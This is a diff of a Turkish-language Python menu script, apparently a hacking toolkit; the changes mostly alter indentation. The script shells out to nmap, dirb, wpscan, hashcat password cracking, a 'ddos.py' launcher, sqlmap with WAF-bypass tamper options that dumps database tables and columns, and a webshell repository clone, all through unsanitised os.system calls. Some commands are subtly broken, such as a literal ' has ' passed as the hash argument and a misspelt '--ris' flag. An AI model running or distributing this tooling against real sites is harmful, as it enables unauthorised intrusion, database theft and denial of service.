@@ -43,73 +43,73 @@ HOŞGELDIN !!!
 islem = input(BOLD+MAVİ+"R1Px~#  ")
 
 if(islem == "1"):
-	ip = input("Enter Destination IP : ")
-	os.system("nmap " + " -sC " + " -sV " + ip + " -Pn ")
+        ip = input("Enter Destination IP : ")
+        os.system("nmap " + " -sC " + " -sV " + ip + " -Pn ")
 
 elif(islem == "2"):
-	print("http://domain.com/ https://domain.com/")
-	web = input("Web sitesini giriniz: ")
-	os.system("dirb " + web)
+        print("http://domain.com/ https://domain.com/")
+        web = input("Web sitesini giriniz: ")
+        os.system("dirb " + web)
 
 elif(islem == "3"):
-	wp = input("Enter website : ")
-	os.system("wpscan " + " --url " + wp)
+        wp = input("Enter website : ")
+        os.system("wpscan " + " --url " + wp)
 
 elif(islem == "4"):
-	hash = input("Enter HASH: ")
-	os.system("hashcat " + "-m 0 " + " -a 0 " + hash + " " "/usr/share/wordlists/rockyou.txt")
-	
+        hash = input("Enter HASH: ")
+        os.system("hashcat " + "-m 0 " + " -a 0 " + hash + " " "/usr/share/wordlists/rockyou.txt")
+
 elif(islem == "5"):
-	has = input("Enter HASH : ")
-	os.system("hashcat -m 1400 " " -a 0 " + " has " "/usr/share/wordlists/rockyou.txt")
+        has = input("Enter HASH : ")
+        os.system("hashcat -m 1400 " " -a 0 " + " has " "/usr/share/wordlists/rockyou.txt")
 
 elif(islem == "6"):
-	print("LOADIND !")
-	os.system("python3 proxy.py")
-	print("File --> /root/Desktop/proxy.txt")
+        print("LOADIND !")
+        os.system("python3 proxy.py")
+        print("File --> /root/Desktop/proxy.txt")
 
 elif(islem == "7"):
-	os.system("python ddos.py")
+        os.system("python ddos.py")
 
 elif(islem == "8"):
-	print("")
-	site = input("Sitenizi Giriniz: ")
-	print("")
+        print("")
+        site = input("Sitenizi Giriniz: ")
+        print("")
 
-	os.system("sqlmap -u " + site + " --dbs --random-agent --skip-waf --tamper=between,randomcase --level=5 --risk=3 --no-cast --threads=10 --batch ")
+        os.system("sqlmap -u " + site + " --dbs --random-agent --skip-waf --tamper=between,randomcase --level=5 --risk=3 --no-cast --threads=10 --batch ")
 
-	print("")
-	database = input("Database Giriniz: ")
-	print("")
+        print("")
+        database = input("Database Giriniz: ")
+        print("")
 
-	os.system("sqlmap -u " + site + "-D " + database  + " --tables --random-agent --skip-waf --tamper=between,randomcase --level=5 --risk=3 --no-cast --threads=10 --batch")
+        os.system("sqlmap -u " + site + "-D " + database  + " --tables --random-agent --skip-waf --tamper=between,randomcase --level=5 --risk=3 --no-cast --threads=10 --batch")
 
-	print("")
-	tables = input("Tablo Giriniz: ")
-	print("")
+        print("")
+        tables = input("Tablo Giriniz: ")
+        print("")
 
-	os.system("sqlmap -u " + site + "-D " + database + " -T " + tables + " --columns --random-agent --skip-waf --tamper=between,randomcase --level=5 --ris=3 --no-cast --threads=10 --batch")
+        os.system("sqlmap -u " + site + "-D " + database + " -T " + tables + " --columns --random-agent --skip-waf --tamper=between,randomcase --level=5 --ris=3 --no-cast --threads=10 --batch")
 
-	print("")
-	kolon = input("Kolon Giriniz: ")
-	print("")
+        print("")
+        kolon = input("Kolon Giriniz: ")
+        print("")
 
-	os.system("sqlmap -u " + site + "-D " + database + " -T " + tables + " -C " + kolon + " --dump --random-agent --skip-waf --tamper=between,randomcase --level=5 --ris=3 --no-cast --threads=10 --batch")
+        os.system("sqlmap -u " + site + "-D " + database + " -T " + tables + " -C " + kolon + " --dump --random-agent --skip-waf --tamper=between,randomcase --level=5 --ris=3 --no-cast --threads=10 --batch")
 
 elif(islem == "9"):
-	print("IP or ftpsite.com")
-	print("Test To username and password = anonymous")
-	ftp = input("Site: ")
-	os.system("ftp " + ftp)
+        print("IP or ftpsite.com")
+        print("Test To username and password = anonymous")
+        ftp = input("Site: ")
+        os.system("ftp " + ftp)
 
 elif(islem == "10"):
-	print("IP exp: 127.0.0.1")
-	tel = input("Site: ")
-	os.system("telnet" + tel)
+        print("IP exp: 127.0.0.1")
+        tel = input("Site: ")
+        os.system("telnet " + tel)
 
 elif(islem == "11"):
-	print("WebShell Installing")
-	os.system("git clone https://github.com/tennc/webshell")
+        print("WebShell Installing")
+        os.system("git clone https://github.com/tennc/webshell")
 
 else:
-	("ERROR !!!")
+        ("ERROR !!!")
